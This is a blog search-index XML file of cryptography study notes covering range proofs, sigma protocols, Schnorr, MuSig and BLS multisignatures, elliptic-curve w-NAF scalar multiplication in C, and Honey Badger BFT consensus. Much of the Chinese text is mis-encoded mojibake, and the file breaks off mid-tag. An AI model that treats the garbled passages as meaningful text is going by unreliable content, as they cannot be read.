<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Some tricks about zk (1)</title>
      <link href="/2023/03/21/Some-tricks-about-zk-1/"/>
      <url>/2023/03/21/Some-tricks-about-zk-1/</url>
      
        <content type="html"><![CDATA[<h4 id="Range-Proof"><a href="#Range-Proof" class="headerlink" title="Range Proof"></a>Range Proof</h4><blockquote><p>based on Sigma Protocol</p></blockquote><p><strong>[å‰ç½®çŸ¥è¯†]</strong></p><p><strong>u-ary</strong> representation: $\sigma=\sum_j(\sigma_j u^j)$</p><p>based on <strong>Boneh-Boyen</strong> signature scheme:</p><p>to show $\sigma_j\in\{0,1,â€¦,u-1\}$ without revealing its value</p><ul><li>$x$ is private key, $A_i=g^{\frac{1}{x+i}}$ (for $\forall i\in\{0,1,â€¦,u-1\}$)</li><li>$V_j=A_{\sigma_j}^{v_j}$</li><li>$e(V_j,g^x)\overset{\text{?}}{=}e(V_j,g)^{-\sigma_j}\cdot e(g,g)^{v_j}$, <strong>($\Sigma$ protocol format)</strong></li></ul><p>Obviously, $e(g,g)^{\frac{x\cdot v_j}{x+\sigma_j}}=e(g,g)^{\frac{-\sigma_j\cdot v_j}{x+\sigma_j}}\cdot e(g,g)^{v_j}$</p><p><strong>[æ­£å¼åè®®]</strong></p><p>Prove $\{(g,h\in\mathbb{G},u,l;\sigma,r\in\mathbb{Z}_p):C=g^\sigma h^r\and \sigma\in[0,u^l]\}$</p><ul><li><p>$\mathcal{V}\rightarrow\mathcal{P}:$ </p><p>picks random $x\in_R\mathbb{Z}_p$</p><p>sends $y=g^x$ and $A_i=g^{\frac{1}{x+i}}$ (for $\forall i\in\{0,1,â€¦,u-1\}$)</p></li><li><p>$\mathcal{P}\rightarrow\mathcal{V}:$ </p><p>picks $v_j\in_R\mathbb{Z}_p$</p><p>sends $V_j=A_{\sigma_j}^{v_j}$ (for $\forall j\in\{0,1,â€¦,l-1\}$)</p></li></ul><p>Turn to Prove $\{(â€¦,v_j):C=h^r\prod_j(g^{u^j})^{\sigma_j}\and V_j=g^{\frac{v_j}{x+\sigma_j}}\}$</p><p><strong>($\Sigma$ protocol format)</strong></p><ul><li><p>$\mathcal{P}\rightarrow\mathcal{V}:$ </p><p>picks $s_j,t_j,m_j\in_R\mathbb{Z}_p$ (for $\forall j\in\{0,1,â€¦,l-1\}$)</p><p>sends $a_j=e(V_j,g)^{-s_j}e(g,g)^{t_j}$ and $D=\prod_j(g^{u^j})^{s_j}h^{m_j}$</p></li><li><p>$\mathcal{V}\rightarrow\mathcal{P}:$ </p><p>sends a random challenge $c\in_R\mathbb{Z}_p$</p></li><li><p>$\mathcal{P}\rightarrow\mathcal{V}:$ </p><p>sends $z_{\sigma_j}=s_j-\sigma_j c$, $z_{v_j}=t_j-v_j c$, $z_r=m-rc$</p></li><li><p>$\mathcal{V}:$ </p><p>checks that</p><ul><li><p>$D\overset{\text{?}}{=}C^ch^{z_r}\prod_j(g^{u^j})^{z_{\sigma_j}}$</p></li><li><p>$a_j\overset{\text{?}}{=}e(V_j,y)^c\cdot e(V_j,g)^{-z_{\sigma_j}}\cdot e(g,g)^{z_{v_j}}$</p><p>Obviously, $e(V_j,y)^c=e(V_j,g)^c\cdot e(g,g)^{x}$</p></li></ul></li></ul><p><img src= "/img/loading.gif" data-src="/2023/03/21/Some-tricks-about-zk-1/image-20230321112444145.png" alt="image-20230321112444145" style="zoom:50%;"></p><p>ä»»æ„åŒºé—´çš„èŒƒå›´è¯æ˜è½¬æ¢å¯¹äºBullet Proofä¹ŸåŒç†</p><p><strong>[å‚è€ƒæ–‡çŒ®]</strong></p><p>Camenisch, J., Chaabouni, R., shelat, a. (2008). Efficient Protocols for Set Membership and Range Proofs. In: Pieprzyk, J. (eds) Advances in Cryptology - ASIACRYPT 2008. ASIACRYPT 2008. Lecture Notes in Computer Science, vol 5350. Springer, Berlin, Heidelberg. <a href="https://doi.org/10.1007/978-3-540-89255-7_15" target="_blank" rel="noopener">https://doi.org/10.1007/978-3-540-89255-7_15</a></p><h4 id="Transform-bilinear-pairing-into-Sigma-Protocol-Format"><a href="#Transform-bilinear-pairing-into-Sigma-Protocol-Format" class="headerlink" title="Transform bilinear pairing into Sigma Protocol Format"></a>Transform bilinear pairing into Sigma Protocol Format</h4><p>$\Sigma=\{(w_a,w_b):e(a,b)=e(w_a,cg_2^{w_b})\}$</p><p>picks $r\in_{R}\mathbb{Z}_q$ï¼Œcomputes $x=c^{r},y=w_ag_1^r,z=rw_b$</p><p>ç­‰ä»·$\Sigmaâ€™=\{(z,w_b):\frac{e(y,c)}{e(a,b)}=\frac{e(g_1,xg_2^z)}{e(y,g_2)^{w_b}}\}$</p><p>å‡è®¾$w_a=g_1^{w_aâ€™},c=g_2^{câ€™}$ï¼Œåˆ™ï¼ˆåŒçº¿æ€§å¯¹å±•å¼€ç³»æ•°ï¼‰æœ‰</p><p>$(w_aâ€™+r)câ€™-w_aâ€™(câ€™+w_b)=(câ€™r+rw_b)-(w_aâ€™+r)w_b$æ˜¾ç„¶æˆç«‹</p><p>$\Sigmaâ€™$ is <strong>in Sigma Protocol Format</strong> (with $x,y$ public)</p><p><strong>[å‚è€ƒæ–‡çŒ®]</strong></p><p>Y. Yu, Y. Zhao, Y. Li, X. Du, L. Wang and M. Guizani, â€œBlockchain-Based Anonymous Authentication With Selective Revocation for Smart Industrial Applications,â€ in IEEE Transactions on Industrial Informatics, vol. 16, no. 5, pp. 3290-3300, May 2020, doi: 10.1109/TII.2019.2944678.</p><p><em>(page 5-6)</em></p>]]></content>
      
      
      <categories>
          
          <category> Postgraduate </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Note of RingCT 2.0</title>
      <link href="/2022/09/09/Note-of-RingCT-2-0/"/>
      <url>/2022/09/09/Note-of-RingCT-2-0/</url>
      
        <content type="html"><![CDATA[<div class="row">    <embed src="RingCT_2.0.pdf" width="100%" height="550" type="application/pdf"></div>]]></content>
      
      
      <categories>
          
          <category> Postgraduate </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Overview of used cryptography concepts in blockchain</title>
      <link href="/2022/09/06/Overview-of-used-cryptography-concepts-in-blockchain/"/>
      <url>/2022/09/06/Overview-of-used-cryptography-concepts-in-blockchain/</url>
      
        <content type="html"><![CDATA[<h3 id="Signature-Scheme"><a href="#Signature-Scheme" class="headerlink" title="Signature Scheme"></a>Signature Scheme</h3><ul><li><p>Multi-Signature ( &amp; aggregation )</p><p><strong>Schnorr</strong>: <a href="https://zhuanlan.zhihu.com/p/145550969" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/145550969</a></p><p><img src= "/img/loading.gif" data-src="/2022/09/06/Overview-of-used-cryptography-concepts-in-blockchain/v2-c0e159da641a597a961580a4b35df889_1440w.jpg" alt></p><p>ç­¾åèšåˆ($\sum$)åŠå®‰å…¨æ€§åˆ†æï¼š<a href="https://www.defidaonews.com/article/6684336" target="_blank" rel="noopener">https://www.defidaonews.com/article/6684336</a></p><p>$s\cdot G==R+Hash(R,X,m)\cdot X$</p><p>Hashä¿®æ­£ä¸ºå…¬å…±$Hash(\sum R,\sum X,m)$ï¼Œä¸”ä»signingé˜¶æ®µå³ç»Ÿä¸€ä¿®æ­£</p><ul><li><p>é€šä¿¡å¼€é”€ï¼ˆnèŠ‚ç‚¹ï¼‰ï¼š</p><p>å‡è®¾æ¯ä¸ªèŠ‚ç‚¹å‡å…±äº«$R_i=k_i\cdot G$ï¼ˆ$O(n^2)$ï¼‰ï¼Œåˆ™ä»…åœ¨å…¶ä¸­ä¸€ä¸ªèŠ‚ç‚¹ä¸Šå¾—åˆ°èšåˆç­¾åçš„é€šä¿¡æ€»å¼€é”€ä¸º$O(n^2+n)=O(n^2)$</p><p>å‡è®¾åªå‘å…¶ä¸­ä¸€ä¸ªèŠ‚ç‚¹$i$å‘é€$R_j$ï¼Œç”±å…¶èšåˆåï¼Œè¿”å›å…¬å…±Hashï¼Œæœ€åè®¡ç®—å‡º$s_j$ç”±èŠ‚ç‚¹$i$å¾—åˆ°æœ€ç»ˆç­¾åï¼Œé€šä¿¡æ€»å¼€é”€çº¦ä¸º$O(n+n+n)=O(n)$</p></li><li><p>å¯†é’¥æ¶ˆé™¤æ”»å‡»ï¼še.g. åŒèŠ‚ç‚¹æƒ…å†µä¸‹ï¼Œä¼ªé€ å…¬é’¥ä¸º$X_1-X_2$ï¼Œä½¿å¾—ä»…ç§é’¥$x_1$å³å¯å®Œæˆèšåˆç­¾å</p><p>Q: ç±»æ¯”Bitcoinçš„<code>P2SH</code>ï¼Œè¯¥æ”»å‡»çš„å‰ç½®æ¡ä»¶æ˜¯å¤šé‡ç­¾åçš„åœ°å€å¯¹åº”çš„å…¬é’¥å·²ç»æ˜¯ä¼ªé€ åçš„å…¬é’¥ï¼Œä¹Ÿå°±æ˜¯è¯´éœ€è¦å—å®³è€…çš„èµ„é‡‘è½¬å…¥åˆ°è¯¥å¤šç­¾åœ°å€ä¸­ï¼Œæš‚å¾…è§£å†³</p></li><li><p>ç­¾åä½¿ç”¨çš„$r$ä¸éšæœºï¼ˆæ¼æ´åˆ†æç±»ä¼¼ECDSAï¼‰</p></li></ul><p><strong>MuSig</strong>: <a href="https://bitcoinops.org/en/topics/musig/" target="_blank" rel="noopener">https://bitcoinops.org/en/topics/musig/</a></p><p><img src= "/img/loading.gif" data-src="/2022/09/06/Overview-of-used-cryptography-concepts-in-blockchain/image-20220906093644274.png" alt></p><p><strong>BLS</strong>: <a href="https://crypto.stanford.edu/~dabo/pubs/papers/BLSmultisig.html" target="_blank" rel="noopener">https://crypto.stanford.edu/~dabo/pubs/papers/BLSmultisig.html</a></p><p>å¼•å…¥åŒçº¿æ€§å¯¹è§£å†³å¤šè½®é€šä¿¡å¼€é”€é—®é¢˜</p><p><img src= "/img/loading.gif" data-src="/2022/09/06/Overview-of-used-cryptography-concepts-in-blockchain/image-20220906144538165.png" alt></p><p>åŸºäºBLSçš„é—¨é™ç­¾åï¼š<a href="https://learnblockchain.cn/2019/08/29/bls" target="_blank" rel="noopener">https://learnblockchain.cn/2019/08/29/bls</a></p><p>VSSç§é’¥ç‰‡æ®µåˆ†å‘çš„ç»†èŠ‚å’ŒShamiré—¨é™æ–¹æ¡ˆåŸºæœ¬ä¸€è‡´ï¼ˆæ‹‰æ ¼æœ—æ—¥æ’å€¼æ¢å¤å¤šé¡¹å¼ç³»æ•°ï¼‰</p><p>éªŒè¯$e(g\cdot(a_0+b_0+â€¦),Hash(s))==e(g,Hash(s)\cdot(a_0+b_0+â€¦))$</p></li><li><p>Blind Signature</p></li><li><p>Ring Signature</p><p>å»ºä¸ªæ–°å‘ï¼š<a href="https://link.springer.com/chapter/10.1007/978-3-319-66399-9_25" target="_blank" rel="noopener">https://link.springer.com/chapter/10.1007/978-3-319-66399-9_25</a></p><p>çœ‹å®Œé—¨ç½—çš„RingCTå›æ¥è¡¥</p></li><li><p>Threshold Signature</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Postgraduate </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Engineering Practice of Cryptosystem(2)</title>
      <link href="/2022/07/20/Engineering-Practice-of-Cryptosystem-2/"/>
      <url>/2022/07/20/Engineering-Practice-of-Cryptosystem-2/</url>
      
        <content type="html"><![CDATA[<h2 id="Assignment"><a href="#Assignment" class="headerlink" title="Assignment"></a>Assignment</h2><p>åœ¨å®éªŒå®¤ç®—æ³•åº“ï¼ˆéƒ¨åˆ†ï¼‰çš„åŸºç¡€ä¸Šå®ç°</p><ul><li>æ¤­åœ†æ›²çº¿æ ‡é‡ä¹˜ï¼ˆæ–¹æ³•é€‰çš„Sliding windowï¼Œä½†å›ºå®šåŸºç‚¹æ ‡é‡ä¹˜ä¹Ÿéœ€è¦ç”¨åˆ°w-NAFï¼Œå°±ä¹Ÿå®ç°äº†w-NAFï¼‰</li><li>ä¸Šå±‚SM2æ¨¡å—ï¼ˆæ•°å­—ç­¾å+å…¬é’¥åŠ å¯†ï¼‰</li></ul><h2 id="Record"><a href="#Record" class="headerlink" title="Record"></a>Record</h2><h3 id="fp"><a href="#fp" class="headerlink" title="fp"></a>fp</h3><p>æœ‰é™åŸŸæ¨¡å—å‡é‡‡ç”¨Montgomeryè¡¨ç¤ºï¼Œå³$x\rightarrow x\cdot R\ (mod\ N)$ï¼Œè¾“å‡ºæ—¶ï¼ˆè°ƒç”¨<code>fp_wt_bin</code>ï¼‰å†åšMontçº¦ç®€</p><p>æœ¬ç§‘æ¯•è®¾å†™çš„æ ¼å¯†ç åº“å°±åŸºäºMontgomeryåšäº†æ¨¡çº¦ç®€ï¼ŒåŒæ—¶å®ç°äº†AVX2çš„å¹¶è¡Œä¼˜åŒ–ï¼Œä½†å‚ç…§çš„æ˜¯<strong>NFLlib</strong>çš„æŠ€æœ¯è·¯çº¿ï¼Œä¸æ¶‰åŠå¤šç²¾åº¦ï¼ˆMultiprecision Montgomeryï¼‰</p><p>é˜…è¯»<code>bn_mont_mul_low</code>å‡½æ•°çš„é€»è¾‘åï¼Œæ¢³ç†å¦‚ä¸‹ï¼š</p><p><img src= "/img/loading.gif" data-src="/2022/07/20/Engineering-Practice-of-Cryptosystem-2/QQå›¾ç‰‡20220720161816.png" alt></p><h3 id="ecp"><a href="#ecp" class="headerlink" title="ecp"></a>ecp</h3><h4 id="ç‚¹åŠ -å€ç‚¹"><a href="#ç‚¹åŠ -å€ç‚¹" class="headerlink" title="ç‚¹åŠ /å€ç‚¹"></a>ç‚¹åŠ /å€ç‚¹</h4><p>æ¤­åœ†æ›²çº¿æ¨¡å—ä¸‹çš„ç‚¹åŠ åŸºäºé›…å¯æ¯”åæ ‡ï¼ˆä¸ºäº†é¿å…ä»¿å°„åæ ‡ä¸‹çš„æ±‚é€†è¿ç®—ï¼›æ— ç©·è¿œç‚¹å³$Z=0$ï¼‰</p><p>ä»¿å°„åæ ‡ä¸‹ï¼š</p><script type="math/tex; mode=display">\left\{\begin{aligned}\lambda & =\frac{y_2-y_1}{x_2-x_1}\\x_3 & =\lambda^2-x_1-x_2\\y_3 & =\lambda(x_1-x_3)-y_1\end{aligned}\right.</script><p>è½¬åŒ–ä¸ºé›…å¯æ¯”åæ ‡ï¼š$(X,Y)\rightarrow(X,Y,1)$ï¼Œåˆ™ç‚¹åŠ è¿ç®—è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p><img src= "/img/loading.gif" data-src="/2022/07/20/Engineering-Practice-of-Cryptosystem-2/QQå›¾ç‰‡20220720161550.jpg" alt></p><p>å€ç‚¹çš„æ¨å¯¼ç±»ä¼¼ï¼Œç®—æ³•åº“æä¾›çš„æ¥å£å‡å·²å®ç°</p><h4 id="æ ‡é‡ä¹˜"><a href="#æ ‡é‡ä¹˜" class="headerlink" title="æ ‡é‡ä¹˜"></a>æ ‡é‡ä¹˜</h4><p>ç¿»å‡ºäº†å¤§äºŒä¹°çš„ã€Šæ¤­åœ†ä¸è¶…æ¤­åœ†æ›²çº¿å…¬é’¥å¯†ç çš„ç†è®ºä¸å®ç°ã€‹â€¦ï¼ˆåƒç°</p><ul><li><p>Sliding Window</p><p><strong>Input</strong>: æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹P, æ•´æ•°$k=\sum_{j=0}^{l-1}k_j2^j$</p><p><strong>Output</strong>: Q=[k]P</p><p>çª—å£ä¸Šé™=rï¼ˆæ¨¡æ•°256-bitä¸‹ï¼Œæš‚è®¾r=5ï¼‰</p><p><img src= "/img/loading.gif" data-src="/2022/07/20/Engineering-Practice-of-Cryptosystem-2/QQå›¾ç‰‡20220720174702.jpg" alt></p><p>$k_j=1$æ—¶ï¼Œå¯ä»¥åœ¨å¤„ç†å®Œ$h_j$é‚£æ®µåï¼Œç›´æ¥å†åš$t-(j-r+1)$æ¬¡å€ç‚¹è¿ç®—ï¼Œå…±è®¡è·³è¿‡äºŒè¿›åˆ¶é•¿åº¦=rçš„çª—å£</p></li><li><p>w-NAF</p><p>è®¾æ•´æ•°kä¸ºlæ¯”ç‰¹é•¿ï¼Œåˆ™å¯å°†kå†™ä½œSDè¡¨è¾¾å¼ï¼ˆbinary signed digit representationï¼‰$\sum_{j=0}^{l}s_j2^j,\ s_j\in\{-1,0,1\}$</p><p>å…¶ä¸­ï¼Œè‹¥è¦æ±‚SDè¡¨è¾¾å¼æ˜¯ç¨€ç–çš„ï¼ˆæ— ä»»ä½•ä¸¤ä¸ªéé›¶å€¼ç›¸é‚»ï¼‰ï¼Œå³ä¸ºNAFè¡¨è¾¾å¼</p><p>åœ¨kçš„æ‰€æœ‰SDè¡¨è¾¾å¼ä¸­ï¼ŒNAFè¡¨è¾¾å¼çš„é‡é‡æœ€å°ï¼Œä¸”å…·å¤‡å”¯ä¸€æ€§</p><p>å°†æ•´æ•°kè½¬æ¢ä¸ºNAFè¡¨è¾¾å¼çš„å®ç°å¦‚ä¸‹ï¼ˆç®—æ³•1ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ecp_to_wnaf</span><span class="params">(<span class="keyword">const</span> ecp_ctx* group, <span class="keyword">int8_t</span>* R, <span class="keyword">const</span> <span class="keyword">dig_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// default NAF_2(k), i.e. w = 2</span></span><br><span class="line">    <span class="keyword">int</span> N_dig = group-&gt;N-&gt;digs;</span><br><span class="line">    <span class="keyword">dig_t</span> k_copy[MAX_BN_DIGS];</span><br><span class="line">    bn_copy(k_copy, k, N_dig);</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (!bn_is_zero(k_copy, N_dig)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (k_copy[<span class="number">0</span>] &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (k_copy[<span class="number">0</span>] &amp; <span class="number">0x02</span>) &#123;</span><br><span class="line">                R[j++] = <span class="number">-1</span>;</span><br><span class="line">                bn_add_dig(k_copy, k_copy, <span class="number">1</span>, N_dig);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                R[j++] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            R[j++] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bn_rsh_low(k_copy, k_copy, <span class="number">1</span>, N_dig);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> j;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“<code>k_copy % 4 = 3</code>æ—¶ï¼Œä»¤<code>R[j]=-1</code>ï¼›<code>k_copy % 4 = 1</code>æ—¶ï¼Œä»¤<code>R[j]=1</code>ï¼›å¦åˆ™ä»¤<code>R[j]=0</code></p><p>è¿­ä»£ä»¤<code>k_copy = (k_copy - R[j]) &gt;&gt; 1</code>ï¼ˆç”±äºk_copyä¸ºå¥‡æ—¶ï¼Œå‡å»R[j]ä½¿å¾—å…¶%4=0ï¼Œå› æ­¤ä¸‹ä¸€æ¬¡çš„k_copyå¿…ä¸ºå¶ï¼Œä¿è¯äº†NAFçš„ç¨€ç–æ€§ï¼‰ï¼Œæœ€åè¾“å‡ºçš„<code>R[j]</code>å³ä¸ºNAFè¡¨è¾¾å¼çš„$s_j$</p><p>IEEE P1363æ ‡å‡†ä¸­è¿˜æœ‰å¦ä¸€ç§éšå¼è½¬åŒ–ä¸ºNAFçš„æ–¹æ³•ï¼ˆç®—æ³•2ï¼‰ï¼š</p><p><img src= "/img/loading.gif" data-src="/2022/07/20/Engineering-Practice-of-Cryptosystem-2/Snipaste_2022-07-20_20-38-10.jpg" alt></p><p>å¯¹äºç®—æ³•2ç”Ÿæˆçš„NAFè¡¨è¾¾å¼æ­£ç¡®æ€§è¯æ˜å¦‚ä¸‹ï¼ˆå³è¯æ˜$d_j=s_j$ï¼‰ï¼š</p><p><img src= "/img/loading.gif" data-src="/2022/07/20/Engineering-Practice-of-Cryptosystem-2/QQå›¾ç‰‡20220720161824.png" alt></p><p>æµ‹è¯•åå‘ç°åŸºäºç®—æ³•2çš„w-NAFæ ‡é‡ä¹˜è¦ç•¥å¿«äºç®—æ³•1ï¼ˆw=2ï¼‰ï¼Œè€Œä¸”æ»‘åŠ¨çª—å£æ³•ä¹Ÿæ¯”w-NAFè¦ç•¥å¿«</p></li><li><p>å›ºå®šåŸºç‚¹G</p><p>è®¾åŸºç‚¹Gçš„é˜¶æœ‰n-bitï¼Œåˆ™é¢„è®¡ç®—æ‰€æœ‰çš„$[2]P,[2^2]P,â€¦,[2^{n}P]$</p><p>è°ƒç”¨æ ‡é‡ä¹˜æ—¶ï¼Œå†å°†kè½¬æ¢ä¸ºNAFè¡¨ç¤ºï¼Œåœ¨æ¯ä¸ªä¸ä¸º0çš„ä½ä¸Šè¿›è¡Œå•æ¬¡ç‚¹åŠ å³å¯</p></li></ul><h3 id="sm2"><a href="#sm2" class="headerlink" title="sm2"></a>sm2</h3><p>ç•¥</p>]]></content>
      
      
      <categories>
          
          <category> Postgraduate </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Research on aBFT</title>
      <link href="/2021/12/06/Research-on-aBFT/"/>
      <url>/2021/12/06/Research-on-aBFT/</url>
      
        <content type="html"><![CDATA[<h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><blockquote><p><a href="https://medium.com/@crytpol_25852/asynchronous-byzantine-fault-tolerance-a-time-independent-future-proof-byzantine-fault-f6f1a4d1f17a" target="_blank" rel="noopener">https://medium.com/@crytpol_25852/asynchronous-byzantine-fault-tolerance-a-time-independent-future-proof-byzantine-fault-f6f1a4d1f17a</a></p><p>Nonetheless, all these protocols employ at their core a synchronous (or partially/weak synchronous) BFT consensus algorithm which makes them unsuitable for TRULY permissionless blockchain settings where â€œnetwork links can be unreliable, network speeds change rapidly, and network delays may even be adversarially inducedâ€ Â¹â·. All these BFT variants might be prepared to tolerate malfunction faults due to adversarial collusion or damage in the nodes according to the classical definition of a byzantine attack but the internet has taught us that byzantine behavior can evolve beyond to what a legacy understanding of what is a byzantine attack could have predicted. For instance, BotnetsdÂ¹â¸ and Distributed Denial of Service (DDoS) attacks can easily be used to flood with packets an important node involved heavily in consensus and thus delaying the transmission of packets said node must send/receive for the network to achieve consensus, leading to the halting of the entire network. In this scenario is evident that synchronous consensus algorithms are susceptible to time-delayed attack due to the fact that the transmission of messages needed to achieve consensus are time-bounded. Therefore, synchronous BFT consensus algorithms are not the strongest form BFT because time-assumption are made which makes provably impossible to guarantee liveness in adversarial settings where time-based attacks are constant as can certainly happen when we use the internetÂ¹â¹.</p></blockquote><p>BFT protocols which can run in <em>asynchronous</em> networks are particularly robust against attacks that can be mounted over public networks. Such asynchronous BFT (<strong>aBFT</strong>) protocols ensure that transactions are processed without timing assumptions.</p><p><strong>å¼‚æ­¥ï¼ˆAsynchronousï¼‰</strong>ç¯å¢ƒä¸‹åªä¿è¯æ¶ˆæ¯æœ€ç»ˆèƒ½å¤Ÿåˆ°è¾¾ï¼Œä½†æ²¡æœ‰å¯¹äºåˆ°è¾¾æ—¶é—´çš„é™åˆ¶ã€‚aBFTåœ¨è®¾è®¡ä¸Šéœ€è¦ä¿è¯å…±è¯†ç³»ç»Ÿä¸ä¼šä¸§å¤±æ´»æ€§ã€‚</p><h3 id="Honey-Badger-BFT"><a href="#Honey-Badger-BFT" class="headerlink" title="Honey Badger BFT"></a>Honey Badger BFT</h3><p>æ ¸å¿ƒæ¨¡å—â†’å¼‚æ­¥å…±åŒå­é›†åè®®ï¼ˆAsynchronous Common Subset, ACSï¼‰ï¼Œä¸”HB-BFTå°†ACSåè®®åˆ†å‰²ä¸ºä¸¤ä¸ªå­æ¨¡å—ï¼š</p><p>åœ¨ç¬¬ä¸€é˜¶æ®µï¼Œæ¯ä¸ªèŠ‚ç‚¹ä½¿ç”¨RBCåè®®ï¼ˆReliable Broadcastï¼‰å°†æœ¬åœ°çš„proposalå¹¿æ’­ç»™å…¶ä»–èŠ‚ç‚¹ï¼›åœ¨ç¬¬äºŒé˜¶æ®µï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½å¹¶è¡Œæ‰§è¡Œnä¸ªABAåè®®ï¼ˆAsynchronous Binary Agreementï¼‰ï¼Œæ¥å…±è¯†ä¸€ä¸ª<strong>ä½å‘é‡</strong>ï¼ˆç”¨äºè¡¨ç¤ºå“ªäº›RBCå·²æˆåŠŸï¼‰</p><p>é—¨é™åŠ å¯†æ¨¡å—â†“</p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/Snipaste_2021-12-03_18-02-44.png" alt></p><h4 id="Main-Procedure"><a href="#Main-Procedure" class="headerlink" title="Main Procedure"></a>Main Procedure</h4><p>å®Œæ•´çš„Honey Badger BFTæµç¨‹å¦‚ä¸‹ï¼š</p><ol><li>æ¯ä¸ªèŠ‚ç‚¹ä»æœ¬åœ°äº¤æ˜“æ± ï¼ˆbufï¼‰ä¸­éšæœºé€‰å–$\lfloor B/N\rfloor$ä¸ªäº¤æ˜“ï¼Œä½œä¸º$proposed$ã€‚å¹¶ä½¿ç”¨é—¨é™åŠ å¯†æ¨¡å—Setupåçš„å…±äº«å…¬é’¥$PK$å¯¹$proposed$è¿›è¡ŒåŠ å¯†â†’$x$ï¼›</li><li>æ¯ä¸ªèŠ‚ç‚¹éƒ½å¹¶è¡Œæ‰§è¡Œ$\{RBC_i\}_N,\{ABA_i\}_N$ï¼Œç»„æˆACSæ¨¡å—ã€‚å°†$x$ä½œä¸ºå„è‡ªACSæ¨¡å—çš„è¾“å…¥ï¼ˆå®é™…ä¸Šå¯¹äºèŠ‚ç‚¹$\mathcal{P}_j$ï¼Œå³ä½œä¸ºæœ¬åœ°$RBC_j$çš„è¾“å…¥ï¼Œè§Figure_4ï¼‰ï¼Œå¾—åˆ°ç³»ç»Ÿå…±è¯†â€œYESâ€åçš„<em>enc_proposed</em>é›†åˆï¼›</li><li>å¯¹Step 2è¾“å‡ºçš„<em>enc_proposed</em>é›†åˆè¿›è¡Œéå†å¤„ç†ï¼šå¹¿æ’­è‡ªå·±çš„ç§˜å¯†ä»½é¢$e_j$ï¼Œå¹¶é€šè¿‡f+1ä»½share messageè§£å¯†å¾—åˆ°æ˜æ–‡äº¤æ˜“é›†ï¼›</li><li>æ’åºäº¤æ˜“é›†ï¼Œå†™å…¥åŒºå—ï¼ˆä½†å®˜æ–¹è®ºæ–‡ä¸­çš„e.g. lexicographicallyæœ‰ç‚¹è¿·æƒ‘å“ˆâ€¦åŒºå—äº¤æ˜“å¯ä»¥è¿™ä¹ˆå®šåºçš„å˜›â“ï¼‰</li><li>ä»æœ¬åœ°äº¤æ˜“æ± ä¸­removeå·²ç¡®è®¤äº¤æ˜“ï¼›</li></ol><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/53841f31b5ed66280d2b3adc62ef9db5_5_Figure_1.png" alt="Figure_1"></p><h4 id="ACS-Asynchronous-Common-Subset"><a href="#ACS-Asynchronous-Common-Subset" class="headerlink" title="ACS (Asynchronous Common Subset)"></a>ACS (Asynchronous Common Subset)</h4><p>Ben-Orç­‰äººè®¾è®¡äº†ä¸‹è¿°åè®®ï¼Œæ¥è¾¾æˆå®¹é‡è‡³å°‘ä¸º$N-f$çš„å­é›†å…±è¯†ã€‚ï¼ˆ$N-f$ä¸ºæœ€å¤§å®¹é”™ä¸‹çš„è¯šå®èŠ‚ç‚¹æ•°ï¼‰</p><p>for party $\mathcal{P}_i$ï¼š</p><ol><li><p>æœ¬åœ°è¾“å…¥ï¼Œä½œä¸º$RBC_i$çš„è¾“å…¥ï¼›</p></li><li><p>$RBC_j$æ‰§è¡ŒæˆåŠŸï¼Œå°†$ABA_j$çš„è¾“å…¥ç½®1ï¼›</p></li><li><p>è‡³å°‘<strong>$N-f$ä¸ª$ABA$å®ä¾‹</strong>æ‰§è¡Œå®Œæˆæ—¶ï¼Œå°†å…¶ä»–$ABA$å®ä¾‹è¾“å…¥å‡ç½®0ï¼›</p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/Snipaste_2021-12-04_13-58-02.png" alt></p><p>ä¸Šå›¾ä¸ºå®˜æ–¹è®ºæ–‡çš„è§£é‡Šï¼Œç”±æ­¤å¯¹ç™»é“¾ç¤¾åŒº<a href="https://learnblockchain.cn/article/2494#ACS--Asynchronous-Common-Subset-" target="_blank" 